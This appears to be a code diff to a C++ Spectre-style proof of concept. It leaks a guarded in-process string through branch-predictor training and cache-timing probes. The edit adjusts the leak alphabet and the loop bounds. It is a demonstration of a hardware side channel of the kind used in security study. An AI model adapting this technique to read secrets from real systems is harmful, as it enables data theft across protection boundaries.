@@ -24,14 +24,15 @@ using u64 = unsigned long long;
 alignas(PAGE_SZ) volatile u64 LIMIT = 4;
 
 alignas(PAGE_SZ) u8 covert[256 * PAGE_SZ];
-alignas(PAGE_SZ) const char* secret_space = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+alignas(PAGE_SZ) const char* secret_space = "ABCDEFGHIJKLMNOPQRSTUVWXYZ_";
+int secret_space_length = 0;        // Computed at program entry.
 alignas(PAGE_SZ) char store[27] = {0};
 
 volatile u8 sink = 0;
 
 alignas(PAGE_SZ) struct Data {
     u8 values[4] = {1, 2, 3, 4};            // 'get_value' doesn't guard this.
-    char secret[21] = "HORRIBLYYBROKENNCODE";  // 'get_value' does guard this.
+    char secret[21] = "HORRIBLY_BROKEN_CODE";  // 'get_value' does guard this.
 } S;
 
 [[gnu::noinline]] u8 get_value(int idx, u8* covert) {
@@ -61,7 +62,7 @@ inline u32 probe_latency(u8* addr) {
 }
 
 char recover_byte(int byte_idx, u8* covert, int threshold, int hit_threshold, int& sum) {
-    int hits[26] = {0};
+    int hits[secret_space_length] = {0};
     int rounds = 1000;
     for (int r = 0; r < rounds; r++) {
         // Train the predictor toward "taken".
@@ -71,7 +72,7 @@ char recover_byte(int byte_idx, u8* covert, int threshold, int hit_threshold, in
 
         // Flush the bound and the probe lines.
         _mm_clflush((void*)&LIMIT);
-        for (int i = 0; i < 26; i++) {
+        for (int i = 0; i < secret_space_length; i++) {
             _mm_clflush(&covert[PAGE_SZ * (u8)secret_space[i]]);
         }
 
@@ -82,7 +83,7 @@ char recover_byte(int byte_idx, u8* covert, int threshold, int hit_threshold, in
         sum += get_value(byte_idx, covert);
         _mm_mfence();
 
-        for (int n = 0; n < 26; n++) {
+        for (int n = 0; n < secret_space_length; n++) {
             u8 c = (u8)secret_space[n];
             u32 latency = probe_latency(&covert[PAGE_SZ * c]);
             hits[n] +=  latency < threshold;
@@ -90,7 +91,7 @@ char recover_byte(int byte_idx, u8* covert, int threshold, int hit_threshold, in
     }
 
     // A real leaked byte hits on the large majority of rounds.
-    for (int i = 0; i < 26; i++) {
+    for (int i = 0; i < secret_space_length; i++) {
         if (hits[i] >= hit_threshold) {
             return secret_space[i];
         }
@@ -104,6 +105,7 @@ int main(int argc, char** argv) {
     u32 threshold = argc > 1 ? atoi(argv[1]) : 160;
     u32 hit_threshold = argc > 2 ? atoi(argv[2]) : 1;
     int secret_length = strlen(S.secret);
+    secret_space_length = strlen(secret_space);
 
     // Prefault covert pages.
     for (int i = 0; i < 256; i++) {
